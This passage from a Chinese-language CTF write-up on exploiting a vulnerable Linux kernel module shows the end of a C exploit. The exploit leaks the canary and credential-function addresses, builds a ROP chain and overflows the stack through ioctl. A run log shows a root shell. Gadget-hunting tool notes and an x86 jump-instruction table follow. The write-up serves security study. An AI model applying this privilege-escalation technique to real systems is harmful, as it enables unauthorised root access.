<span id="cb39-104"><a href="#cb39-104" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-105"><a href="#cb39-105" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set commit_cred and prepare_kernel_cred address</span></span>
<span id="cb39-106"><a href="#cb39-106" aria-hidden="true" tabindex="-1"></a>    commit_cred_addr <span class="op">=</span> get_commit_cred_addr<span class="op">();</span></span>
<span id="cb39-107"><a href="#cb39-107" aria-hidden="true" tabindex="-1"></a>    prepare_kernel_cred_addr <span class="op">=</span> get_prepare_kernel_cred_addr<span class="op">();</span></span>
<span id="cb39-108"><a href="#cb39-108" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;commit_cred:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> commit_cred_addr<span class="op">);</span></span>
<span id="cb39-109"><a href="#cb39-109" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;prepare_kernel_cred:%016llx</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> prepare_kernel_cred_addr<span class="op">);</span></span>
<span id="cb39-110"><a href="#cb39-110" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;sizeof name_payload:%d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb39-111"><a href="#cb39-111" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-112"><a href="#cb39-112" aria-hidden="true" tabindex="-1"></a>    <span class="co">//use rop to get root shell</span></span>
<span id="cb39-113"><a href="#cb39-113" aria-hidden="true" tabindex="-1"></a>    save_status<span class="op">();</span></span>
<span id="cb39-114"><a href="#cb39-114" aria-hidden="true" tabindex="-1"></a>    build_rop<span class="op">(</span>canary<span class="op">);</span></span>
<span id="cb39-115"><a href="#cb39-115" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set name</span></span>
<span id="cb39-116"><a href="#cb39-116" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-117"><a href="#cb39-117" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span>fd<span class="op">,</span> name_payload<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>name_payload<span class="op">));</span></span>
<span id="cb39-118"><a href="#cb39-118" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-119"><a href="#cb39-119" aria-hidden="true" tabindex="-1"></a>    <span class="co">// triger stack mash and excute shellcode to promote to root</span></span>
<span id="cb39-120"><a href="#cb39-120" aria-hidden="true" tabindex="-1"></a>    <span class="dt">long</span> <span class="dt">long</span> len <span class="op">=</span> <span class="op">-</span><span class="dv">65336</span><span class="op">;</span><span class="co">//unsinged short len ==200=8*25 which is size of name_payload</span></span>
<span id="cb39-121"><a href="#cb39-121" aria-hidden="true" tabindex="-1"></a>    ioctl<span class="op">(</span>fd<span class="op">,</span> core_copy_func_cmd<span class="op">,</span> len<span class="op">);</span></span>
<span id="cb39-122"><a href="#cb39-122" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb39-123"><a href="#cb39-123" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb39-124"><a href="#cb39-124" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>执行结果如下：</p>
<div class="sourceCode" id="cb40"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$</span> ./start3.sh </span>
<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a><span class="ex">SeaBIOS</span> <span class="er">(</span><span class="ex">version</span> 1.13.0-1ubuntu1<span class="kw">)</span></span>
<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a><span class="ex">iPXE</span> <span class="er">(</span><span class="ex">http://ipxe.org</span><span class="kw">)</span> <span class="ex">00:03.0</span> CA00 PCI2.10 PnP PMM+1FF8C8B0+1FECC8B0 CA00</span>
<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Booting</span> from ROM...</span>
<span id="cb40-12"><a href="#cb40-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-13"><a href="#cb40-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb40-14"><a href="#cb40-14" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span>    0.043542] Spectre V2 <span class="er">:</span> <span class="ex">Spectre</span> mitigation: LFENCE not serializing, switching to generic retpoline</span>
<span id="cb40-15"><a href="#cb40-15" aria-hidden="true" tabindex="-1"></a><span class="ex">udhcpc:</span> started, v1.26.2</span>
<span id="cb40-16"><a href="#cb40-16" aria-hidden="true" tabindex="-1"></a><span class="ex">udhcpc:</span> sending discover</span>
<span id="cb40-17"><a href="#cb40-17" aria-hidden="true" tabindex="-1"></a><span class="ex">udhcpc:</span> sending select for 10.0.2.15</span>
<span id="cb40-18"><a href="#cb40-18" aria-hidden="true" tabindex="-1"></a><span class="ex">udhcpc:</span> lease of 10.0.2.15 obtained, lease time 86400</span>
<span id="cb40-19"><a href="#cb40-19" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> $ ./exp_3 </span>
<span id="cb40-20"><a href="#cb40-20" aria-hidden="true" tabindex="-1"></a><span class="ex">a43af88a5e527900</span> 00007ffcad163290 ffffffffc007619b ffffa242d7f50900 ffffffff83ddd6d1 000000000000889b ffffa242d7f4f000 ffffffff83d8ecfa 0000000000000026 0000000000000000 0000000000000000 </span>
<span id="cb40-21"><a href="#cb40-21" aria-hidden="true" tabindex="-1"></a><span class="ex">get</span> canay is:a43af88a5e527900</span>
<span id="cb40-22"><a href="#cb40-22" aria-hidden="true" tabindex="-1"></a><span class="ex">commit_cred:ffffffff83c9c8e0</span></span>
<span id="cb40-23"><a href="#cb40-23" aria-hidden="true" tabindex="-1"></a><span class="ex">prepare_kernel_cred:ffffffff83c9cce0</span></span>
<span id="cb40-24"><a href="#cb40-24" aria-hidden="true" tabindex="-1"></a><span class="ex">sizeof</span> name_payload:200</span>
<span id="cb40-25"><a href="#cb40-25" aria-hidden="true" tabindex="-1"></a><span class="ex">user_cs:0x0000000000000033</span></span>
<span id="cb40-26"><a href="#cb40-26" aria-hidden="true" tabindex="-1"></a><span class="ex">user_ss:0x000000000000002b</span></span>
<span id="cb40-27"><a href="#cb40-27" aria-hidden="true" tabindex="-1"></a><span class="ex">user_rsp:0x00007ffcad163240</span></span>
<span id="cb40-28"><a href="#cb40-28" aria-hidden="true" tabindex="-1"></a><span class="ex">user_flag:0x0000000000000206</span></span>
<span id="cb40-29"><a href="#cb40-29" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> <span class="co"># id</span></span>
<span id="cb40-30"><a href="#cb40-30" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
<span id="cb40-31"><a href="#cb40-31" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> <span class="co"># whoami</span></span>
<span id="cb40-32"><a href="#cb40-32" aria-hidden="true" tabindex="-1"></a><span class="ex">root</span></span>
<span id="cb40-33"><a href="#cb40-33" aria-hidden="true" tabindex="-1"></a><span class="ex">/</span> <span class="co"># </span></span></code></pre></div>
<h3 id="工具使用">4.4.工具使用：</h3>
<p>提取vmlinux：</p>
<p>extract-vmlinux(<a
href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">linux/extract-vmlinux
at master · torvalds/linux · GitHub</a>)</p>
<div class="sourceCode" id="cb41"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./extract-vmlinux.sh</span> ./bzImage <span class="op">&gt;</span>vmlinux_out</span></code></pre></div>
<p>ropper安装</p>
<div class="sourceCode" id="cb42"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">python</span> <span class="at">-m</span> pip install ropper</span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a> <span class="ex">python</span> <span class="at">-m</span> pip install keystone-engine</span></code></pre></div>
<p>PS: 未安装keystone-engine，会导致报错 module ‘keystone’ has no
attribute ‘KS_ARCH_X86’</p>
<p>也可以使用ROPgadget获得gadget，但是获取的信息好像没办法识别iret</p>
<blockquote>
<p>ROPgadget –binary ./vmlinux_out &gt; gadget.txt</p>
<p>ROPgadget –binary vmlinux_out –only “pop|ret” &gt; gadget2.txt</p>
</blockquote>
<p>其次使用ropper获得daget：</p>
<blockquote>
<p>ropper –file ./vmlinux_out –nocolor &gt;gadget_ropper2.txt</p>
</blockquote>
<p>ropper获得信息比较全：</p>
<div class="sourceCode" id="cb43"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ash@ash-VirtualBox:~/03.ctf/10.kernel/01.core_give/give_to_player$</span> cat gadget_ropper2.txt<span class="kw">|</span><span class="fu">grep</span> iretq</span>
<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0xffffffff81050aba:</span> mov eax, cs<span class="kw">;</span> <span class="ex">push</span> rax<span class="kw">;</span> <span class="ex">push</span> <span class="at">-0x7efaf53c</span><span class="kw">;</span> <span class="ex">iretq</span><span class="kw">;</span> <span class="ex">ret</span><span class="kw">;</span> </span>
<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0xffffffff81050abd:</span> push <span class="at">-0x7efaf53c</span><span class="kw">;</span> <span class="ex">iretq</span><span class="kw">;</span> <span class="ex">ret</span><span class="kw">;</span> </span>
<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0xffffffff81050abc:</span> push rax<span class="kw">;</span> <span class="ex">push</span> <span class="at">-0x7efaf53c</span><span class="kw">;</span> <span class="ex">iretq</span><span class="kw">;</span> <span class="ex">ret</span><span class="kw">;</span> </span>
<span id="cb43-5"><a href="#cb43-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0xffffffff81050ac2:</span> iretq<span class="kw">;</span> <span class="ex">ret</span><span class="kw">;</span> </span>
<span id="cb43-6"><a href="#cb43-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0xffffffff81050ab9:</span> pushfq<span class="kw">;</span> <span class="ex">mov</span> eax, cs<span class="kw">;</span> <span class="ex">push</span> rax<span class="kw">;</span> <span class="ex">push</span> <span class="at">-0x7efaf53c</span><span class="kw">;</span> <span class="ex">iretq</span><span class="kw">;</span> <span class="ex">ret</span><span class="kw">;</span> </span></code></pre></div>
<p><em>Note:不确定上面的现象是不是普遍现象.</em></p>
<h2 id="遗留问题">5. 遗留问题</h2>
<ul>
<li><p>iret机制？（中断返回）</p></li>
<li><p>swapgs的工作原理（交换了什么内容，影响什么）</p></li>
<li><p>为什么最后一定要通过iret来进行跳转？</p></li>
</ul>
<h2 id="附录">6. 附录</h2>
<p>参考：</p>
<p>1.[ctf中 linux 内核态的漏洞挖掘与利用系列]
https://www.anquanke.com/post/id/270917</p>
<p>2.其他参考</p>
<p>intel跳转指令：</p>
<blockquote>
<p>intel的跳转指令，需要借助eflags状态：</p>
<p>JE ;等于则跳转 JNE ;不等于则跳转 JZ ;为 0 则跳转 JNZ ;不为 0 则跳转
JS ;为负则跳转 JNS ;不为负则跳转 JC ;进位则跳转 JNC ;不进位则跳转 JO
;溢出则跳转 JNO ;不溢出则跳转 JA ;⽆符号⼤于则跳转 JNA
;⽆符号不⼤于则跳转 JAE ;⽆符号⼤于等于则跳转 JNAE
;⽆符号不⼤于等于则跳转 JG ;有符号⼤于则跳转 JNG ;有符号不⼤于则跳转 JGE
;有符号⼤于等于则跳转 JNGE ;有符号不⼤于等于则跳转</p>
<p>JB ;⽆符号⼩于则跳转 JNB ;⽆符号不⼩于则跳转 JBE
;⽆符号⼩于等于则跳转 JNBE ;⽆符号不⼩于等于则跳转 JL ;有符号⼩于则跳转
JNL ;有符号不⼩于则跳转 JLE ;有符号⼩于等于则跳转 JNLE
;有符号不⼩于等于则跳转 JP ;奇偶位置位则跳转 JNP ;奇偶位清除则跳转 JPE
;奇偶位相等则跳转 JPO ;奇偶位不等则跳转</p>
</blockquote>
</body>
</html>
